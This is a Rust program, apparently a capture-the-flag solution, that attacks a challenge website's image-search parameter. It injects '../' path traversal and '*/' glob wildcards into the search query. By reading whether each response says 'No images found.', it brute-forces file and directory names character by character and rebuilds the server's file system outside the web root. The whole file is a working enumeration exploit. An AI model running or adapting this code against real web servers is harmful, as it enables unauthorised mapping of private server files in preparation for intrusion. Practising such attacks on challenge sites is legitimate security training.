use async_recursion::async_recursion;
use futures::StreamExt;
use reqwest::{Method, Response};
use std::{
    collections::{hash_map::Entry, HashMap},
    sync::{Arc, Mutex},
};

const PATH_CHARACTERS: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-=_.";
const SEARCH_URL: &str = "http://art.shieldchallenges.com/?search=";
const PATH_DOESNT_EXIST_MSG: &[u8] = b"No images found.";

#[tokio::main]
async fn main() {
    let root = FileSystemEntry::Dir {
        subentries: HashMap::new(),
    };
    let root_container = Arc::new(Mutex::new(root));
    scan_directory("../".to_string(), 4, root_container).await;
    // search_files("../", Arc::clone(&root_container)).await;
    // search_dirs("../", 4, root_container).await;
}
#[derive(Debug)]
enum FileSystemEntry {
    File,
    Dir {
        subentries: HashMap<String, FileSystemEntry>,
    },
}
impl FileSystemEntry {
    fn get_dir<'a>(&'a mut self, dir: &str) -> Option<&'a mut HashMap<String, FileSystemEntry>> {
        let mut parts = dir.split(',');
        // consume the first part
        parts.next().unwrap();
        self.get_next_dir(&mut parts)
    }
    fn get_next_dir<'a>(
        &'a mut self,
        parts: &mut std::str::Split<char>,
    ) -> Option<&'a mut HashMap<String, FileSystemEntry>> {
        match self {
            FileSystemEntry::File => None,
            FileSystemEntry::Dir { subentries } => {
                let path_part = match parts.next() {
                    Some(str) => str,
                    None => return Some(subentries),
                };

                if let Entry::Vacant(v) = subentries.entry(path_part.to_string()) {
                    let new_dir = FileSystemEntry::Dir {
                        subentries: HashMap::new(),
                    };
                    v.insert(new_dir);
                }
                subentries.get_mut(path_part).unwrap().get_next_dir(parts)
            }
        }
    }
}
fn add_file(directory: &str, file_name: &str, file_system: &Arc<Mutex<FileSystemEntry>>) {
    let mut root = loop {
        if let Ok(root) = file_system.lock() {
            break root;
        };
    };
    let dir = match root.get_dir(directory) {
        Some(v) => v,
        None => return,
    };
    dir.insert(file_name.to_string(), FileSystemEntry::File);
}
async fn path_exists(response: Response) -> bool {
    let mut stream = response.bytes_stream();
    let mut index_in_search_string = 0usize;
    while let Some(Ok(bytes)) = stream.next().await {
        for byte in bytes {
            if byte == PATH_DOESNT_EXIST_MSG[index_in_search_string] {
                index_in_search_string += 1;
                if index_in_search_string == PATH_DOESNT_EXIST_MSG.len() {
                    return false;
                }
            } else {
                index_in_search_string = 0;
            }
        }
    }
    true
}
async fn search_files(directory: String, filesystem: Arc<Mutex<FileSystemEntry>>) {
    search_files_recursive(directory, "".to_string(), filesystem)
        .await
        .unwrap();
}

#[async_recursion]
async fn search_files_recursive(
    directory: String,
    cur_file: String,
    filesystem: Arc<Mutex<FileSystemEntry>>,
) -> reqwest::Result<bool> {
    async fn try_url(
        client: &reqwest::Client,
        url: &str,
        directory: &str,
        any_path_existed: &mut bool,
        cur_file: &str,
        next_char: char,
        filesystem: &Arc<Mutex<FileSystemEntry>>,
    ) -> reqwest::Result<()> {
        loop {
            if let Ok(response) = client.request(Method::GET, url).send().await {
                if path_exists(response).await {
                    *any_path_existed = true;
                    let mut filename = cur_file.to_string();
                    filename.push(next_char);
                    tokio::spawn(search_files_recursive(
                        directory.to_string(),
                        filename,
                        Arc::clone(filesystem),
                    ));
                }
                break Ok(());
            }
        }
    }
    let client = reqwest::Client::new();
    let mut url = String::from(SEARCH_URL);
    let mut any_path_existed = false;
    url.push_str(directory.as_str());
    url.push_str(cur_file.as_str());
    for chr in PATH_CHARACTERS.chars() {
        url.push(chr);
        try_url(
            &client,
            &url,
            &directory,
            &mut any_path_existed,
            cur_file.as_str(),
            chr,
            &filesystem,
        )
        .await?;
        url.pop();
    }
    if !any_path_existed {
        add_file(directory.as_str(), cur_file.as_str(), &filesystem);
        println!("Added file: {}{}", directory, cur_file);
    }
    Ok(any_path_existed)
}

fn prepare_dir_for_search(dir: &mut String, new_char: char, depth: usize) {
    dir.push(new_char);
    for _ in 0..depth {
        dir.push_str("*/");
    }
}

fn restore_dir_after_search(dir: &mut String, depth: usize) {
    dir.truncate(dir.len() - 1 - 2 * depth);
}

#[async_recursion]
async fn search_dirs_recursive(
    base_directory: String,
    cur_dir: String,
    max_depth: usize,
    cur_depth: Option<usize>,
    filesystem: Arc<Mutex<FileSystemEntry>>,
) -> reqwest::Result<bool> {
    async fn try_url(
        client: &reqwest::Client,
        url: &str,
        any_path_existed: &mut bool,
        cur_dir: &str,
        next_char: char,
        max_depth: usize,
        cur_depth: usize,
        base_directory: &str,
        filesystem: &Arc<Mutex<FileSystemEntry>>,
    ) -> reqwest::Result<()> {
        loop {
            if let Ok(response) = client.request(Method::GET, url).send().await {
                if path_exists(response).await {
                    println!("Path exists: {}", url);
                    *any_path_existed = true;
                    let mut dirname = cur_dir.to_string();
                    dirname.push(next_char);
                    tokio::spawn(search_dirs_recursive(
                        base_directory.to_string(),
                        dirname,
                        max_depth,
                        Some(cur_depth),
                        Arc::clone(&filesystem),
                    ));
                }
                break Ok(());
            }
        }
    }
    println!("Starting search. cur_dir: {}", cur_dir);
    let client = reqwest::Client::new();
    let mut url = String::from(SEARCH_URL);
    let mut any_path_existed = false;
    url.push_str(base_directory.as_str());
    url.push_str(cur_dir.as_str());
    match cur_depth {
        Some(depth) => {
            for chr in PATH_CHARACTERS.chars() {
                prepare_dir_for_search(&mut url, chr, depth);
                if cur_dir != "." && cur_dir != ".." {
                    try_url(
                        &client,
                        &url,
                        &mut any_path_existed,
                        &cur_dir,
                        chr,
                        max_depth,
                        depth,
                        &base_directory,
                        &filesystem,
                    )
                    .await?;
                }
                restore_dir_after_search(&mut url, depth);
            }
            if !any_path_existed {
                println!("Found directory: {}{}", base_directory, cur_dir);
                let mut new_base_directory = base_directory.clone();
                new_base_directory.push_str(&cur_dir);
                new_base_directory.push('/');
                tokio::spawn(scan_directory(new_base_directory, max_depth, filesystem));
            }
        }
        None => {
            for chr in PATH_CHARACTERS.chars() {
                for depth in 1..=max_depth {
                    prepare_dir_for_search(&mut url, chr, depth);
                    if cur_dir != "." && cur_dir != ".." {
                        try_url(
                            &client,
                            &url,
                            &mut any_path_existed,
                            &cur_dir,
                            chr,
                            max_depth,
                            depth,
                            &base_directory,
                            &filesystem,
                        )
                        .await?;
                    }
                    restore_dir_after_search(&mut url, depth);
                }
            }
        }
    }
    Ok(any_path_existed)
}

async fn search_dirs(
    base_directory: String,
    max_depth: usize,
    filesystem: Arc<Mutex<FileSystemEntry>>,
) {
    search_dirs_recursive(
        base_directory,
        "".to_string(),
        max_depth,
        None,
        filesystem,
    )
    .await
    .unwrap();
}

async fn scan_directory(
    directory: String,
    max_depth: usize,
    filesystem: Arc<Mutex<FileSystemEntry>>,
) {
    println!("Scanning directory: {}",directory);
    tokio::spawn(search_files(directory.clone(), Arc::clone(&filesystem)));
    search_dirs(directory, max_depth, filesystem).await
}
